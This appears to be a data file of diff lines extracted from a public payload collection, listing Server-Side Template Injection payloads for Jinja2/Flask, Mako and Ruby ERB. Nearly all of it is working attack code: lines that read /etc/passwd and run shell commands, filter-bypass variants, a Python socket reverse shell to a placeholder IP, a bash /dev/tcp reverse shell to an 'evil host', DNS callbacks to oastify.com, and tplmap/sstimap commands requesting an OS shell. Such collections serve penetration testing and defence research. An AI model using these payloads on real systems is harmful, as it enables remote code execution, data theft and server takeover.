+{% block body %},ssti,payloads_all_the_things
+<ul>,ssti,payloads_all_the_things
+{% for user in users %},ssti,payloads_all_the_things
+"<li><a href=""{{ user.url }}"">{{ user.username }}</a></li>",ssti,payloads_all_the_things
+{% endfor %},ssti,payloads_all_the_things
+</ul>,ssti,payloads_all_the_things
+{% endblock %},ssti,payloads_all_the_things
+<pre>{% debug %}</pre>,ssti,payloads_all_the_things
+{{ [].class.base.subclasses() }},ssti,payloads_all_the_things
+{{''.class.mro()[1].subclasses()}},ssti,payloads_all_the_things
+{{ ''.__class__.__mro__[2].__subclasses__() }},ssti,payloads_all_the_things
+{{ self.__init__.__globals__.__builtins__ }},ssti,payloads_all_the_things
+"{% for key, value in config.iteritems() %}",ssti,payloads_all_the_things
+<dt>{{ key|e }}</dt>,ssti,payloads_all_the_things
+<dd>{{ value|e }}</dd>,ssti,payloads_all_the_things
+# ''.__class__.__mro__[2].__subclasses__()[40] = File class,ssti,payloads_all_the_things
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }},ssti,payloads_all_the_things
+"{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](""/tmp/flag"").read() }}",ssti,payloads_all_the_things
+# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398,ssti,payloads_all_the_things
+"{{ get_flashed_messages.__globals__.__builtins__.open(""/etc/passwd"").read() }}",ssti,payloads_all_the_things
+"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}",ssti,payloads_all_the_things
+nc -lnvp 8000,ssti,payloads_all_the_things
+"x.__init__.__builtins__.exec(""from flask import current_app, after_this_request",ssti,payloads_all_the_things
+@after_this_request,ssti,payloads_all_the_things
+"def hook(*args, **kwargs):",ssti,payloads_all_the_things
+from flask import make_response,ssti,payloads_all_the_things
+r = make_response('Powned'),ssti,payloads_all_the_things
+return r,ssti,payloads_all_the_things
+""")",ssti,payloads_all_the_things
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }},ssti,payloads_all_the_things
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }},ssti,payloads_all_the_things
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }},ssti,payloads_all_the_things
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }},ssti,payloads_all_the_things
+{{ cycler.__init__.__globals__.os.popen('id').read() }},ssti,payloads_all_the_things
+{{ joiner.__init__.__globals__.os.popen('id').read() }},ssti,payloads_all_the_things
+{{ namespace.__init__.__globals__.os.popen('id').read() }},ssti,payloads_all_the_things
+"{{ cycler.__init__.__globals__.__builtins__.getattr("""", ""x"" + cycler.__init__.__globals__.os.popen('id').read()) }} # Error-Based",ssti,payloads_all_the_things
+"{{ 1 / (cycler.__init__.__globals__.os.popen(""id"")._proc.wait() == 0) }} # Boolean-Based",ssti,payloads_all_the_things
+"{{ lipsum.__globals__[""os""].popen('id').read() }}",ssti,payloads_all_the_things
+"{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}",ssti,payloads_all_the_things
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},ssti,payloads_all_the_things
+"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""ip\"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/cat\"", \""flag.txt\""]);'"").read().zfill(417)}}{%endif%}{% endfor %}",ssti,payloads_all_the_things
+"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",ssti,payloads_all_the_things
+# evil config,ssti,payloads_all_the_things
+"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}",ssti,payloads_all_the_things
+# load the evil config,ssti,payloads_all_the_things
+{{ config.from_pyfile('/tmp/evilconfig.cfg') }},ssti,payloads_all_the_things
+# connect to evil host,ssti,payloads_all_the_things
+"{{ config['RUNCMD']('/bin/bash -c ""/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1""',shell=True) }}",ssti,payloads_all_the_things
+{{self.__init__.__globals__.__str__()[1786:1788]}},ssti,payloads_all_the_things
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}},ssti,payloads_all_the_things
+request.__class__,ssti,payloads_all_the_things
+"request[""__class__""]",ssti,payloads_all_the_things
+"http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_",ssti,payloads_all_the_things
+"{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}",ssti,payloads_all_the_things
+"{{request|attr([""_""*2,""class"",""_""*2]|join)}}",ssti,payloads_all_the_things
+"{{request|attr([""__"",""class"",""__""]|join)}}",ssti,payloads_all_the_things
+"{{request|attr(""__class__"")}}",ssti,payloads_all_the_things
+{{request.__class__}},ssti,payloads_all_the_things
+"http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_",ssti,payloads_all_the_things
+or,ssti,payloads_all_the_things
+http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_,ssti,payloads_all_the_things
+|join,ssti,payloads_all_the_things
+"http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_",ssti,payloads_all_the_things
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},ssti,payloads_all_the_things
+{{7*'7'}},ssti,payloads_all_the_things
+{{os.system('whoami')}},ssti,payloads_all_the_things
+{%import os%}{{os.system('nslookup oastify.com')}},ssti,payloads_all_the_things
+x=os.popen('id').read(),ssti,payloads_all_the_things
+%>,ssti,payloads_all_the_things
+${x},ssti,payloads_all_the_things
+"${self.module.cache.util.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.module.runtime.util.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.template.module.cache.util.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.module.cache.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+${self.__init__.__globals__['util'].os.system('id')},ssti,payloads_all_the_things
+"${self.template.module.runtime.util.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.module.filters.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.module.runtime.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.module.runtime.exceptions.util.os.system(""id"")}",ssti,payloads_all_the_things
+${self.template.__init__.__globals__['os'].system('id')},ssti,payloads_all_the_things
+"${self.module.cache.util.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.module.runtime.util.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.template._mmarker.module.cache.util.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.template.module.cache.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.module.cache.compat.inspect.linecache.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.template._mmarker.module.runtime.util.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.attr._NSAttr__parent.module.cache.util.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.template.module.filters.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.template.module.runtime.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.module.filters.compat.inspect.linecache.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.module.runtime.compat.inspect.linecache.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.template.module.runtime.exceptions.util.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.attr._NSAttr__parent.module.runtime.util.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.context._with_template.module.cache.util.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.module.runtime.exceptions.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.template.module.cache.util.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.context._with_template.module.runtime.util.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.module.cache.util.compat.inspect.linecache.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.template.module.runtime.util.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.module.runtime.util.compat.inspect.linecache.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.module.runtime.exceptions.traceback.linecache.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.module.runtime.exceptions.util.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.template._mmarker.module.cache.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.template.module.cache.compat.inspect.linecache.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.attr._NSAttr__parent.template.module.cache.util.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.template._mmarker.module.filters.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.template._mmarker.module.runtime.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.template._mmarker.module.runtime.exceptions.util.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.template.module.filters.compat.inspect.linecache.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.template.module.runtime.compat.inspect.linecache.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.attr._NSAttr__parent.template.module.runtime.util.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.context._with_template._mmarker.module.cache.util.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.template.module.runtime.exceptions.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.context._with_template.module.cache.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.module.runtime.exceptions.compat.inspect.linecache.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.context._with_template._mmarker.module.runtime.util.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.context._with_template.module.filters.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.context._with_template.module.runtime.compat.inspect.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.context._with_template.module.runtime.exceptions.util.os.system(""id"")}",ssti,payloads_all_the_things
+"${self.template.module.runtime.exceptions.traceback.linecache.os.system(""id"")}",ssti,payloads_all_the_things
+">>> print(Template(""${self.module.cache.util.os}"").render())",ssti,payloads_all_the_things
+<module 'os' from '/usr/local/lib/python3.10/os.py'>,ssti,payloads_all_the_things
+"${str().join(chr(i)for(i)in[105,100])}",ssti,payloads_all_the_things
+"${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}",ssti,payloads_all_the_things
+"<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}",ssti,payloads_all_the_things
+- An efficient SSTI + CSTI scanner which utilizes novel polyglots,ssti,payloads_all_the_things
+"tinja url -u ""http://example.com/?name=Kirlia"" -H ""Authentication: Bearer ey...""",ssti,payloads_all_the_things
+"tinja url -u ""http://example.com/"" -d ""username=Kirlia""  -c ""PHPSESSID=ABC123...""",ssti,payloads_all_the_things
+- Server-Side Template Injection and Code Injection Detection and Exploitation Tool,ssti,payloads_all_the_things
+python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell,ssti,payloads_all_the_things
+"python2.7 ./tplmap.py -u ""http://192.168.56.101:3000/ti?user=*&comment=supercomment&link""",ssti,payloads_all_the_things
+"python2.7 ./tplmap.py -u ""http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link"" --level 5 -e jade",ssti,payloads_all_the_things
+python3 ./sstimap.py -u 'https://example.com/page?name=John' -s,ssti,payloads_all_the_things
+python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade,ssti,payloads_all_the_things
+python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk',ssti,payloads_all_the_things
+"Rendered, Time-Based:",ssti,payloads_all_the_things
+"${{<%[%'""}}%\.",ssti,payloads_all_the_things
+{{ ... }},ssti,payloads_all_the_things
+${ ... },ssti,payloads_all_the_things
+#{ ... },ssti,payloads_all_the_things
+<%= ... %>,ssti,payloads_all_the_things
+{ ... },ssti,payloads_all_the_things
+{{= ... }},ssti,payloads_all_the_things
+{= ... },ssti,payloads_all_the_things
+\n= ... \n,ssti,payloads_all_the_things
+*{ ... },ssti,payloads_all_the_things
+@{ ... },ssti,payloads_all_the_things
+@( ... ),ssti,payloads_all_the_things
+7 * 7,ssti,payloads_all_the_things
+(1/0).zxy.zxy,ssti,payloads_all_the_things
+(3*4/2),ssti,payloads_all_the_things
+3*)2(/4,ssti,payloads_all_the_things
+((7*8)/(2*4)),ssti,payloads_all_the_things
+7)(*)8)(2/(*4,ssti,payloads_all_the_things
+`{{7*7}}` for Jinja2 (Python).,ssti,payloads_all_the_things
+#{7*7},ssti,payloads_all_the_things
+`#{7*7}` for Thymeleaf (Java).,ssti,payloads_all_the_things
+"**Python**: Django, Jinja2, Mako, ...",ssti,payloads_all_the_things
+"**Java**: Freemarker, Jinjava, Velocity, ...",ssti,payloads_all_the_things
+"**Ruby**: ERB, Slim, ...",ssti,payloads_all_the_things
+%x('id') # Rendered RCE,ssti,payloads_all_the_things
+"File.read(""Y:/A:/""+%x('id')) # Error-Based RCE",ssti,payloads_all_the_things
+"1/(system(""id"")&&1||0) # Boolean-Based RCE",ssti,payloads_all_the_things
+"system(""id && sleep 5"") # Time-Based RCE",ssti,payloads_all_the_things
+#{ 7 * 7 },ssti,payloads_all_the_things
+<%= File.open('/etc/passwd').read %>,ssti,payloads_all_the_things
+<%= Dir.entries('/') %>,ssti,payloads_all_the_things
+<%=(`nslookup oastify.com`)%>,ssti,payloads_all_the_things
+<%= system('cat /etc/passwd') %>,ssti,payloads_all_the_things
+<%= `ls /` %>,ssti,payloads_all_the_things
+<%= IO.popen('ls /').readlines()  %>,ssti,payloads_all_the_things
+"<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>",ssti,payloads_all_the_things
+"<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>",ssti,payloads_all_the_things
+#{ %x|env| },ssti,payloads_all_the_things
